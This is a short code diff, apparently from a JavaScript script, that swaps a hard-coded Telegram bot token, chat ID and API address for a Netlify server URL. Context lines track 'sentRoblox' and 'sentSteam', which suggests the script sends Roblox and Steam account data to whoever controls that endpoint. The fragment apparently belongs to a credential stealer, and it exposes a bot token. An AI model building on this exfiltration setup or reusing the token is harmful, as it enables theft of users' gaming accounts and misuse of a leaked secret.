@@ -1,6 +1,4 @@
-const TOKEN = "8679009953:AAE6I66uPMllDNCAdIL2vTUD7fs_Hvoo7uc";
-const CHAT_ID = "6145369088";
-const API = "https://api.telegram.org/bot" + TOKEN;
+const SERVER_URL = "https://supremevalues.netlify.app";
 
 let sentRoblox = "";
 let sentSteam = "";
